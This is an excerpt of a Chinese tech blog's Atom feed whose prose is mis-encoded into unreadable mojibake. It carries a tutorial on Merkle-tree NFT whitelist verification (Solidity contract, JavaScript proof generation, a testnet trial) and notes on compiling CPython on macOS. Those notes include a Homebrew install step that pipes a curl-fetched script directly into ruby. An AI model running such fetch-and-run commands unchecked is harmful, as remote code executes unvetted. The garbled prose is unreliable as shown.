href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CPython Internals ç¬”è®° â”€â”€ ä»‹ç»ã€å¼€å‘ç¯å¢ƒè®¾ç½®
    
    </summary>
    
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
      <category term="è¯»ä¹¦ç¬”è®°" scheme="https://qiwihui.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="CPythonInternals" scheme="https://qiwihui.com/tags/CPythonInternals/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨ Merkle æ ‘åš NFT ç™½åå•éªŒè¯</title>
    <link href="https://qiwihui.com/qiwihui-blog-151/"/>
    <id>https://qiwihui.com/qiwihui-blog-151/</id>
    <published>2024-05-15T02:25:31.363Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>Merkle æ ‘ç°åœ¨æ™®éç”¨æ¥åšçº¿ä¸Šæ•°æ®éªŒè¯ã€‚è¿™ç¯‡æ–‡ç« ä¸»è¦è§£é‡Šå’Œå®ç°ä½¿ç”¨ Merkle æ ‘åš NFT ç™½åå•éªŒè¯ã€‚</p><p>ä½¿ç”¨ Merkle æ ‘åš NFT ç™½åå•éªŒè¯ï¼Œç®€å•æ¥è¯´å°±æ˜¯å°†æ‰€æœ‰çš„ç™½åå•é’±åŒ…åœ°å€åšä¸º Merkle æ ‘çš„å¶èŠ‚ç‚¹ç”Ÿæˆä¸€æ£µ Merkle æ ‘ï¼Œåœ¨éƒ¨ç½²çš„NFT åˆçº¦ä¸­åªå­˜å‚¨ Merkle æ ‘çš„ root hashï¼Œè¿™æ ·é¿å…äº†åœ¨åˆçº¦ä¸­å­˜å‚¨æ‰€æœ‰ç™½åå•åœ°å€å¸¦æ¥çš„é«˜é¢ gas è´¹ç”¨ã€‚åœ¨ mint æ—¶ï¼Œå‰ç«¯ç”Ÿæˆé’±åŒ…åœ°å€çš„ Merkle proofï¼Œè°ƒç”¨åˆçº¦è¿›è¡ŒéªŒè¯å³å¯ã€‚</p><span id="more"></span><p>ä¸€æ¬¡éªŒè¯è¿‡ç¨‹å‰ç«¯å’Œåˆçº¦è¿è¡Œè¿‡ç¨‹å¦‚å›¾ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/150952521-2c104057-33b9-488e-94d4-c5570767e61b.png" alt="Untitled"></p><p>å›¾ç‰‡æ¥è‡ª [3]</p><h3><span id="merkle-shu">Merkle æ ‘</span></h3><p>è¯¦æƒ…è¯·å‚è§ï¼š<a href="https://en.wikipedia.org/wiki/Merkle_tree">https://en.wikipedia.org/wiki/Merkle_tree</a></p><p><img src="https://user-images.githubusercontent.com/3297411/150952561-e4186a0c-a437-4dfc-a037-7fc2965597c3.png" alt="Untitled 1"></p><p>å›¾ç‰‡æ¥è‡ª [1]</p><p>æ¯”å¦‚ï¼Œä»¥æ°´æœå•è¯ä½œä¸ºå¶èŠ‚ç‚¹ï¼Œç”Ÿæˆ Merkle æ ‘çš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/150952596-213c31de-514e-48fe-8d2f-3b382e730bc5.png" alt="Untitled 2"></p><p>å›¾ç‰‡æ¥è‡ª [2]</p><h3><span id="he-yue-shi-xian">åˆçº¦å®ç°</span></h3><p>æˆ‘ä»¬ç®€å•å®ç° Merkle éªŒè¯çš„è¿‡ç¨‹ï¼Œæ­¤åˆçº¦åŒ…å«ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ol><li>è®¾ç½® Merkle æ ¹å“ˆå¸Œï¼š <code>setSaleMerkleRoot</code></li><li>éªŒè¯ Merkle proofï¼š <code>isValidMerkleProof</code></li><li>mint å¹¶è®°å½•æ˜¯å¦å·²ç»mintï¼š <code>mint</code></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/cryptography/MerkleProof.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Merkle is Ownable &#123;</span><br><span class="line">    bytes32 public saleMerkleRoot;</span><br><span class="line">    mapping(address =&gt; bool) public claimed;</span><br><span class="line"></span><br><span class="line">    function setSaleMerkleRoot(bytes32 merkleRoot) external onlyOwner &#123;</span><br><span class="line">        saleMerkleRoot = merkleRoot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier isValidMerkleProof(bytes32[] calldata merkleProof, bytes32 root) &#123;</span><br><span class="line">        require(</span><br><span class="line">            MerkleProof.verify(</span><br><span class="line">                merkleProof,</span><br><span class="line">                root,</span><br><span class="line">                keccak256(abi.encodePacked(msg.sender))</span><br><span class="line">            ),</span><br><span class="line">            &quot;Address does not exist in list&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(bytes32[] calldata merkleProof)</span><br><span class="line">        external</span><br><span class="line">        isValidMerkleProof(merkleProof, saleMerkleRoot)</span><br><span class="line">    &#123;</span><br><span class="line">        require(!claimed[msg.sender], &quot;Address already claimed&quot;);</span><br><span class="line">        claimed[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="merkle-proof-zheng-ming-sheng-cheng">Merkle proof è¯æ˜ç”Ÿæˆ</span></h3><p>è°ƒç”¨åˆçº¦éªŒè¯çš„ Merkle proof éœ€è¦åœ¨å‰ç«¯ç”Ÿæˆã€‚ç”Ÿæˆè¿‡ç¨‹éœ€è¦ç”¨åˆ° <code>merkletreejs</code>å’Œ <code>keccak256</code> ä¸¤ä¸ªåº“ï¼Œå‰è€…ç”¨äºåˆ›å»º Merkle æ ‘ï¼Œåè€…ç”¨äºç”Ÿæˆå“ˆå¸Œã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save merkletreejs keccak256</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥ï¼Œç”Ÿæˆç™½åå•åœ°å€çš„ Merkle æ ‘ï¼š</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">MerkleTree</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;merkletreejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> keccak256 = <span class="built_in">require</span>(<span class="string">&#x27;keccak256&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> whitelistAddresses = [</span><br><span class="line">    <span class="string">&#x27;0x169841AA3024cfa570024Eb7Dd6Bf5f774092088&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x0a290c8cE7C35c40F4F94070a9Ed592fC85c62B9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x43Be076d3Cd709a38D2f83Cd032297a194196517&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xC7FaB03eecA24CcaB940932559C5565a4cE9cFFb&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xE4336D25e9Ca0703b574a6fd1b342A4d0327bcfa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xeDcB8a28161f966C5863b8291E80dDFD1eB78491&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x77cbd0fa30F83a249da282e9fE90A86d7936FdE7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xc39F9406284CcAeB426D0039a3F6ADe14573BaFe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x16Beb6b55F145E4269279B82c040B7435f1088Ee&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x900b2909127Dff529f8b4DB3d83b957E6aE964c2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xeA2A799793cE3D2eC6BcD066563f385F25401e95&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> leafNodes = whitelistAddresses.<span class="title function_">map</span>(<span class="function"><span class="params">address</span> =&gt;</span> <span class="title function_">keccak256</span>(address));</span><br><span class="line"><span class="keyword">let</span> tree = <span class="keyword">new</span> <span class="title class_">MerkleTree</span>(leafNodes, keccak256, &#123; <span class="attr">sortPairs</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Tree: &#x27;</span>, tree.<span class="title function_">toString</span>());</span><br><span class="line"><span class="comment">// const root = tree.getRoot();</span></span><br><span class="line"><span class="comment">// console.log(&#x27;Root hash is: &#x27;, root.toString(&#x27;hex&#x27;));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Tree:  â””â”€ c7ec7ffb250de2b95a1c690751b2826ec9d2999dd9f5c6f8816655b1590ca544</span></span><br><span class="line"><span class="comment">//    â”œâ”€ 25f76dfbdd295dd14932a7aae9350055e72e9e317cd389c62d525884cc0d0f17</span></span><br><span class="line"><span class="comment">//    â”‚  â”œâ”€ 0613ec9d9455eaa91ffd480afaa50db8952ccf3cf1f04375f08f848dca194a86</span></span><br><span class="line"><span class="comment">//    â”‚  â”‚  â”œâ”€ e0c3820340c8c58fa46f9ff9c8da5037a8f544f839abe168b76aff3fa391e177</span></span><br><span class="line"><span class="comment">//    â”‚  â”‚  â”‚  â”œâ”€ 1575cc1dded49f942913392f94716824d29b8fa45876b2db6295d16a606533a4</span></span><br><span class="line"><span class="comment">//    â”‚  â”‚  â”‚  â””â”€ 6abf3666623175adbce354196686c5e9853334b8eeb8324726a8ca89290c26d1</span></span><br><span class="line"><span class="comment">//    â”‚  â”‚  â””â”€ 6c42c6099e51e28eef8f19f71765bb42c571d5c7177996f177606138f65c0c2b</span></span><br><span class="line"><span class="comment">//    â”‚  â”‚     â”œâ”€ 4d313ef5510345a10724e131139b4556d77adaa109ba87087a600ea00bf92d18</span></span><br><span class="line"><span class="comment">//    â”‚  â”‚     â””â”€ 83260aa668bd8b075be8e34c6f6609ad5be3eee1470f7b30f46e85650097cb98</span></span><br><span class="line"><span class="comment">//    â”‚  â””â”€ b0d6f760008340e3f60414d84b305702faa6418f44f31de07b10e05bf369eb3b</span></span><br><span class="line"><span class="comment">//    â”‚     â”œâ”€ f1e3a4717b4179aecf418fc3a0c92c728828ee399700d9bcb512c6424f86cb7b</span></span><br><span class="line"><span class="comment">//    â”‚     â”‚  â”œâ”€ e00eb5681327801ed923ce4913468e70f833de797cfbc3df1e68dd13000f1fa6</span></span><br><span class="line"><span class="comment">//    â”‚     â”‚  â””â”€ d71c2d63734c3ca3c4257d118442c5796796234f77bb325759973b90e130dc62</span></span><br><span class="line"><span class="comment">//    â”‚     â””â”€ 07ff91a64cd06c27a059056430bddfdf2d54e8833c0ccaa4642b39ed3b22579f</span></span><br><span class="line"><span class="comment">//    â”‚        â”œâ”€ 74b490baa6a881c8934d0aacc7fd778d1bac1e259f17856fccea372b6978bad6</span></span><br><span class="line"><span class="comment">//    â”‚        â””â”€ 3845f80821bbaa15e35bfe9ace50761f9adeebf25b8472fae6e4ff0db394b2da</span></span><br><span class="line"><span class="comment">//    â””â”€ 4c880bf401add28c4e51270dfe16b28c3ca1b3d263ff7c5863fc8214b4046364</span></span><br><span class="line"><span class="comment">//       â””â”€ 4c880bf401add28c4e51270dfe16b28c3ca1b3d263ff7c5863fc8214b4046364</span></span><br><span class="line"><span class="comment">//          â”œâ”€ 52a3b2fbc6bb6ee25b925ac9767246ceb24fd99c64a7dbc72847e6dc8dc52b81</span></span><br><span class="line"><span class="comment">//          â”‚  â”œâ”€ a61d6c75021de68e08a03f83d25738ac77e5e5cce1a63b4d48c2c819254b4375</span></span><br><span class="line"><span class="comment">//          â”‚  â””â”€ 85c68207164ed77f53351eac1a14074cf5cd5b0fb1a664709adcd0ee4aa4ea8d</span></span><br><span class="line"><span class="comment">//          â””â”€ 1689b05d03db07df6c1f227c6f2ad46646a3edf11684c8081b821abbaf45a6dc</span></span><br><span class="line"><span class="comment">//             â”œâ”€ 93b5a65af2ac0633f9f90c6e05c89c30e1d4aba0b6f98d2c2b9bda4118538d9f</span></span><br><span class="line"><span class="comment">//             â””â”€ 159859f50ff6cca7ef1060dcbc1a8daf59820817ea262f3f6107b431024eb9c4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ ¹å“ˆå¸Œå€¼ä¸º <code>0xc7ec7ffb250de2b95a1c690751b2826ec9d2999dd9f5c6f8816655b1590ca544</code> ï¼Œè¿™ä¸ªå€¼åœ¨è°ƒç”¨åˆçº¦å‡½æ•° <code>setSaleMerkleRoot</code> æ—¶éœ€è¦ç”¨åˆ°ï¼Œä¼šä¿å­˜åœ¨åˆçº¦ä¸­ã€‚ç”Ÿæˆçš„ Merkle è¯æ˜éœ€è¦å­˜å‚¨åœ¨é¡µé¢ä¸­ï¼Œä¹Ÿå¯ä»¥å­˜åœ¨ IPFS ä¸­ï¼Œåœ¨ä½¿ç”¨æ—¶åŠ è½½ä½¿ç”¨ã€‚</p><p>ç¬¬äºŒæ­¥ï¼Œéœ€è¦ç”Ÿæˆå‚ä¸ mint åœ°å€çš„ Merkle è¯æ˜ï¼Œå‡è®¾ä½¿ç”¨ <code>0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33</code> åœ°å€è¿›è¡Œ mint æ“ä½œï¼š</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> leaf = <span class="title function_">keccak256</span>(<span class="string">&#x27;0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> proof = tree.<span class="title function_">getHexProof</span>(leaf);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Proof of 0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33: &#x27;</span>, proof);</span><br></pre></td></tr></table></figure><p>å¯¹åº”ç”Ÿæˆçš„è¯æ˜ä¸º</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Proof of 0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33:  [</span><br><span class="line">    <span class="string">&#x27;0x1575cc1dded49f942913392f94716824d29b8fa45876b2db6295d16a606533a4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x6c42c6099e51e28eef8f19f71765bb42c571d5c7177996f177606138f65c0c2b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xb0d6f760008340e3f60414d84b305702faa6418f44f31de07b10e05bf369eb3b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x4c880bf401add28c4e51270dfe16b28c3ca1b3d263ff7c5863fc8214b4046364&#x27;</span></span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><p>åŒæ—¶æˆ‘ä»¬å°†ç”Ÿæˆä¸€ä¸ªå‡çš„è¯æ˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// another proof, for example</span><br><span class="line"></span><br><span class="line">let anotherWhitelistAddresses = [</span><br><span class="line">    &#x27;0x169841AA3024cfa570024Eb7Dd6Bf5f774092088&#x27;,</span><br><span class="line">    &#x27;0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33&#x27;,</span><br><span class="line">    &#x27;0x0a290c8cE7C35c40F4F94070a9Ed592fC85c62B9&#x27;,</span><br><span class="line">    &#x27;0x43Be076d3Cd709a38D2f83Cd032297a194196517&#x27;,</span><br><span class="line">];</span><br><span class="line">let anotherLeafNodes = anotherWhitelistAddresses.map(address =&gt; keccak256(address));</span><br><span class="line">let badTree = new MerkleTree(anotherLeafNodes, keccak256, &#123; sortPairs: true &#125;);</span><br><span class="line"></span><br><span class="line">let badLeaf = keccak256(&#x27;0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33&#x27;);</span><br><span class="line">let badProof = badTree.getHexProof(badLeaf);</span><br><span class="line">console.log(&#x27;Bad proof of 0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33: &#x27;, badProof);</span><br><span class="line"></span><br><span class="line">// Bad proof of 0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33:  [</span><br><span class="line">//     &#x27;0x1575cc1dded49f942913392f94716824d29b8fa45876b2db6295d16a606533a4&#x27;,</span><br><span class="line">//     &#x27;0x6c42c6099e51e28eef8f19f71765bb42c571d5c7177996f177606138f65c0c2b&#x27;</span><br><span class="line">//   ]</span><br></pre></td></tr></table></figure><h3><span id="yan-zheng-guo-cheng">éªŒè¯è¿‡ç¨‹</span></h3><p>æ­¤è¿‡ç¨‹å°†ä½¿ç”¨ Remix IDE è¿›è¡Œéƒ¨ç½²å’Œæµ‹è¯•ï¼š</p><ol><li><p>ä½¿ç”¨ Remix å°†åˆçº¦éƒ¨ç½²åˆ°ä»¥å¤ªåŠæµ‹è¯•ç½‘ <code>Rinkeby</code> ä¸­ï¼Œå¾—åˆ°åˆçº¦åœ°å€ä¸ºï¼š <code>0xb3E2409199855ea9676dc5CFc9DefFd4A1b93eFe</code> ï¼›</p></li><li><p>è°ƒç”¨ <code>setSaleMerkleRoot</code> è®¾ç½® Merkle æ ¹å“ˆå¸Œä¸º <code>0xc7ec7ffb250de2b95a1c690751b2826ec9d2999dd9f5c6f8816655b1590ca544</code> ï¼›</p></li><li><p>è°ƒç”¨ <code>mint</code> ï¼Œä¼ å…¥éæ³• Merkle è¯æ˜ï¼š<code>[&quot;0x1575cc1dded49f942913392f94716824d29b8fa45876b2db6295d16a606533a4&quot;,&quot;0x6c42c6099e51e28eef8f19f71765bb42c571d5c7177996f177606138f65c0c2b&quot;]</code> ï¼Œå¯ä»¥çœ‹åˆ°<a href="https://rinkeby.etherscan.io/tx/0xc21a4f27c80f1427b703da1bccdceb58528e4ba52ac0023430391f4cb9c7ac34">äº¤æ˜“</a>å¤±è´¥ï¼Œæ˜¾ç¤º <code>Fail with error 'Address does not exist in list</code> ï¼›</p></li><li><p>éªŒè¯ <code>0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33</code> åœ°å€å¯¹åº” mint çŠ¶æ€æ˜¯å¦ä¸º falseï¼›</p></li><li><p>è°ƒç”¨ <code>mint</code>ï¼Œä¼ å…¥åˆæ³•çš„ Merkle è¯æ˜ï¼š</p><p><code>[&quot;0x1575cc1dded49f942913392f94716824d29b8fa45876b2db6295d16a606533a4&quot;,&quot;0x6c42c6099e51e28eef8f19f71765bb42c571d5c7177996f177606138f65c0c2b&quot;,&quot;0xb0d6f760008340e3f60414d84b305702faa6418f44f31de07b10e05bf369eb3b&quot;,&quot;0x4c880bf401add28c4e51270dfe16b28c3ca1b3d263ff7c5863fc8214b4046364&quot;]</code>ï¼Œå¯ä»¥çœ‹åˆ°äº¤æ˜“æˆåŠŸï¼›</p></li><li><p>éªŒè¯ <code>0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33</code> åœ°å€å¯¹åº” mint çŠ¶æ€æ˜¯å¦ä¸º <code>true</code>ã€‚</p></li></ol><p>ã€‚</p><h3><span id="can-kao-wen-zhang">å‚è€ƒæ–‡ç« </span></h3><ol><li><a href="https://medium.com/@ItsCuzzo/using-merkle-trees-for-nft-whitelists-523b58ada3f9">Using Merkle Trees for NFT Whitelists</a></li><li><a href="https://medium.com/@jgm.orinoco/understanding-merkle-pollards-1547fc7efaa">Understanding Merkle pollards</a></li><li><a href="https://litentry.medium.com/litentry-weekly-report-nft-pallet-and-merkle-airdrop-f0fe7a32a7da">Litentry this week: NFT pallet and Merkle airdrop</a></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ä½¿ç”¨ Merkle æ ‘åš NFT ç™½åå•éªŒè¯
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CPython Internals ç¬”è®° â”€â”€ ç¼–è¯‘ Python</title>
    <link href="https://qiwihui.com/qiwihui-blog-149/"/>
    <id>https://qiwihui.com/qiwihui-blog-149/</id>
    <published>2024-05-15T02:25:31.362Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>ç°åœ¨ä½ å·²ç»ä¸‹è½½äº† CPython å¼€å‘ç¯å¢ƒå¹¶å¯¹å…¶è¿›è¡Œäº†é…ç½®ï¼Œä½ å¯ä»¥å°† CPython æºä»£ç ç¼–è¯‘æˆä¸€ä¸ªå¯æ‰§è¡Œçš„è§£é‡Šå™¨ã€‚</p><p>ä¸ Python æ–‡ä»¶ä¸åŒï¼ŒC æºä»£ç æ¯æ¬¡æ›´æ”¹æ—¶éƒ½å¿…é¡»é‡æ–°ç¼–è¯‘ã€‚</p><p>åœ¨å‰ä¸€ç« ä¸­ï¼Œæˆ‘ä»¬å·²ç»è®¾ç½®å¼€å‘ç¯å¢ƒï¼Œå¹¶è®¾ç½®äº†è¿è¡Œâ€œBuildâ€é˜¶æ®µçš„é€‰é¡¹ï¼Œè¯¥é€‰é¡¹å°†é‡æ–°ç¼–è¯‘ CPythonã€‚åœ¨æ„å»ºæ­¥éª¤å·¥ä½œä¹‹å‰ï¼Œä½ éœ€è¦ä¸€ä¸ª C ç¼–è¯‘å™¨å’Œä¸€äº›æ„å»ºå·¥å…·ã€‚ä½¿ç”¨çš„å·¥å…·å–å†³äºä½ ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿã€‚</p><span id="more"></span><blockquote><p>å¦‚æœä½ æ‹…å¿ƒè¿™äº›æ­¥éª¤ä¸­çš„ä»»ä½•ä¸€ä¸ªä¼šå¹²æ‰°æ‚¨ç°æœ‰çš„ CPython å®‰è£…ï¼Œè¯·ä¸è¦æ‹…å¿ƒã€‚CPython æºç›®å½•çš„è¡Œä¸ºå°±åƒä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒã€‚</p><p>å¯¹äºç¼–è¯‘ CPythonã€ä¿®æ”¹æºä»£ç å’Œæ ‡å‡†åº“ï¼Œè¿™äº›éƒ½ä¿ç•™åœ¨æºç›®å½•çš„æ²™ç®±ä¸­ã€‚</p><p>å¦‚æœè¦å®‰è£…è‡ªå®šä¹‰ç‰ˆæœ¬ï¼Œæœ¬ç« ä¹Ÿå°†ä»‹ç»æ­¤æ­¥éª¤ã€‚</p></blockquote><h2><span id="zai-macos-xi-tong-shang-bian-yi-cpython">åœ¨ macOS ç³»ç»Ÿä¸Šç¼–è¯‘ CPython</span></h2><p>åœ¨ macOS ä¸Šç¼–è¯‘ CPython éœ€è¦ä¸€äº›é¢å¤–çš„åº”ç”¨ç¨‹åºå’Œåº“ã€‚ä½ é¦–å…ˆéœ€è¦åŸºæœ¬çš„ C ç¼–è¯‘å™¨å·¥å…·åŒ…ã€‚â€œCommand Line Development Toolsâ€ æ˜¯ä¸€ä¸ªå¯ä»¥åœ¨ macOS ä¸­é€šè¿‡ App Store æ›´æ–°çš„åº”ç”¨ç¨‹åºã€‚ä½ éœ€è¦åœ¨ç»ˆç«¯ä¸Šæ‰§è¡Œåˆå§‹å®‰è£…ã€‚</p><p>åœ¨ç»ˆç«¯ä¸­ï¼Œé€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£… C ç¼–è¯‘å™¨å’Œå·¥å…·åŒ…ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xcode-select --install</span><br></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤ä¼šå¼¹å‡ºä¸€ä¸ªæç¤ºï¼Œæç¤ºä¸‹è½½å¹¶å®‰è£…ä¸€ç»„å·¥å…·ï¼ŒåŒ…æ‹¬ Gitã€Make å’Œ GNU C ç¼–è¯‘å™¨ã€‚</p><p>ä½ è¿˜éœ€è¦ä¸€ä»½ <a href="https://www.openssl.org/">OpenSSL</a> çš„å·¥ä½œå‰¯æœ¬ï¼Œç”¨äºä» <a href="http://PyPi.org">PyPi.org</a> ç½‘ç«™è·å–åŒ…ã€‚å¦‚æœä½ ä»¥åè®¡åˆ’ä½¿ç”¨æ­¤æ„å»ºç‰ˆæœ¬æ¥å®‰è£…å…¶ä»–è½¯ä»¶åŒ…ï¼Œåˆ™éœ€è¦è¿›è¡Œ SSL éªŒè¯ã€‚</p><p>åœ¨ macOS ä¸Šå®‰è£… OpenSSL çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ <a href="https://brew.sh/">Homebrew</a>ã€‚</p><p>å¯ä»¥ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤å®‰è£… Homebrewï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/ruby -e <span class="string">&quot;<span class="subst">$(curl -fsSL \</span></span></span><br><span class="line"><span class="subst"><span class="string"> https://raw.githubusercontent.com/Homebrew/install/master/install)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>ä¸€æ—¦å®‰è£…å®Œæˆï¼Œä½ å°±å¯ä»¥ä½¿ç”¨ <code>brew install</code> å‘½ä»¤æ¥å®‰è£…æ‰€éœ€çš„å·¥å…·ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew install openssl xz zlib gdbm sqlite</span><br></pre></td></tr></table></figure><p>ç°åœ¨ä½ å·²ç»å®‰è£…äº†ä¾èµ–é¡¹ï¼Œä½ å¯ä»¥è¿è¡Œ <code>configure</code> è„šæœ¬ã€‚Homebrew æœ‰ä¸€ä¸ªå‘½ä»¤ <code>brew --prefix [package]</code> ï¼Œå®ƒå°†ç»™å‡ºå®‰è£…åŒ…çš„ç›®å½•ã€‚ä½ å°†é€šè¿‡ç¼–è¯‘ Homebrew ä½¿ç”¨çš„ä½ç½®æ¥å¯ç”¨å¯¹ SSL çš„æ”¯æŒã€‚</p><p>æ ‡å¿— <code>--with-pydebug</code> å¯ç”¨è°ƒè¯•æŒ‚é’©ã€‚å¦‚æœä½ æ‰“ç®—å‡ºäºå¼€å‘æˆ–æµ‹è¯•ç›®çš„è¿›è¡Œè°ƒè¯•ï¼Œè¯·æ·»åŠ æ­¤é¡¹ã€‚</p><p>é…ç½®é˜¶æ®µåªéœ€è¦è¿è¡Œä¸€æ¬¡ï¼ŒåŒæ—¶æŒ‡å®š <code>zlib</code> åŒ…çš„ä½ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ CPPFLAGS=<span class="string">&quot;-I<span class="subst">$(brew --prefix zlib)</span>/include&quot;</span> \</span><br><span class="line"> LDFLAGS=<span class="string">&quot;-L<span class="subst">$(brew --prefix zlib)</span>/lib -L<span class="subst">$(brew --prefix bzip2)</span>/lib&quot;</span> \</span><br><span class="line"> ./configure --with-openssl=$(brew --prefix openssl) --with-pydebug</span><br></pre></td></tr></table></figure><p>è¿è¡Œ <code>configure</code> å°†åœ¨å­˜å‚¨åº“çš„æ ¹ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ª <code>Makefile</code>ï¼Œä½ å¯ä»¥ä½¿ç”¨å®ƒæ¥è‡ªåŠ¨åŒ–æ„å»ºè¿‡ç¨‹ã€‚</p><p>ä½ ç°åœ¨å¯ä»¥é€šè¿‡è¿è¡Œä¸€ä¸‹å‘½ä»¤æ¥æ„å»º CPython äºŒè¿›åˆ¶æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make -j2 -s</span><br></pre></td></tr></table></figure><p>åœ¨æ„å»ºè¿‡ç¨‹ä¸­ï¼Œä½ å¯èƒ½ä¼šæ”¶åˆ°ä¸€äº›é”™è¯¯ã€‚åœ¨æ„å»ºæ‘˜è¦ä¸­ï¼Œ<code>make</code> ä¼šé€šçŸ¥ä½ å¹¶éæ‰€æœ‰åŒ…éƒ½å·²æ„å»ºã€‚ä¾‹å¦‚ï¼Œ<code>ossaudiodev</code>ã€<code>spwd</code> å’Œ <code>_tkinter</code> å°†æ— æ³•ä½¿ç”¨è¿™ç»„æŒ‡ä»¤è¿›è¡Œæ„å»ºã€‚å¦‚æœä½ ä¸æ‰“ç®—é’ˆå¯¹è¿™äº›è½¯ä»¶åŒ…è¿›è¡Œå¼€å‘ï¼Œé‚£ä¹Ÿæ²¡å…³ç³»ã€‚å¦‚æœæ˜¯ï¼Œè¯·æŸ¥çœ‹<a href="https://devguide.python.org/">å®˜æ–¹å¼€å‘æŒ‡å—</a>ç½‘ç«™ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚</p><p>æ„å»ºå°†éœ€è¦å‡ åˆ†é’Ÿå¹¶ç”Ÿæˆä¸€ä¸ªåä¸º <code>python.exe</code> çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æ¯æ¬¡å¯¹æºä»£ç è¿›è¡Œæ›´æ”¹æ—¶ï¼Œä½ éƒ½ä¼šéœ€è¦ä½¿ç”¨ç›¸åŒçš„æ ‡å¿—é‡æ–°è¿è¡Œ <code>make</code>ã€‚<code>python.exe</code> äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ CPython 